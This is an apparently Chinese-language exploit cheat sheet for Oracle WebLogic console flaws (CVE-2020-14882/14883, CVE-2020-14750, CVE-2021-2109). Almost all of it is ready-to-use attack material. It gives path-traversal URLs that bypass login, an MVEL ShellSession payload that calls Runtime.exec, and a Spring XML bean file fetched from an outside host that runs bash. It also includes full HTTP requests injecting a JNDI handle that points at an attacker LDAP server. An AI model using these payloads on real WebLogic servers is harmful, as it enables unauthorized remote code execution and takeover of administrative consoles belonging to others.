# CVE-2020-14882/14883
Weblogic ConSole HTTP 协议代码执行漏洞

- CVE-2020-14883: 权限绕过漏洞
- CVE-2020-14882: 代码执行漏洞

影响版本

- WebLogic 10.3.6.0.0
- WebLogic 12.1.3.0.0
- WebLogic 12.2.1.3.0
- WebLogic 12.2.1.4.0
- WebLogic 14.1.1.0.0

未授权访问到管理后台页面 POC
```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
```

12.2.1版本以上使用 `com.tangosol.coherence.mvel2.sh.ShellSession` POC
```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

任意版本使用 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` POC
- 需要Weblogic的服务器能够访问到恶意XML

1. 构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如http://example.com/rce.xml
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```
2. POC
```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```

# CVE-2020-14750
Weblogic Console 验证绕过漏洞

影响版本

- WebLogic 10.3.6.0.0
- WebLogic 12.1.3.0.0
- WebLogic 12.2.1.3.0
- WebLogic 12.2.1.4.0
- WebLogic 14.1.1.0.0

未授权访问到管理后台页面 POC
```
http://your-ip:7001/console/images/%252E./console.portal
```

# CVE-2021-2109
Weblogic RCE(JNDI)

影响版本

- WebLogic 10.3.6.0.0
- WebLogic 12.1.3.0.0
- WebLogic 12.2.1.3.0
- WebLogic 12.2.1.4.0
- WebLogic 14.1.1.0.0

1. POC
- POST
```
POST /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1
Host: 192.168.203.128:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 165

_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.203;128:1389/x0qvh3;AdminServer%22)
```

- GET
```
GET /console/css/%252e%252e%252f/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://10.16.102;190:1389/ykt121;AdminServer%22) HTTP/1.1
Host: 192.168.203.128:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
  Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 165
```

2. JNDI服务器,建议使用ldap协议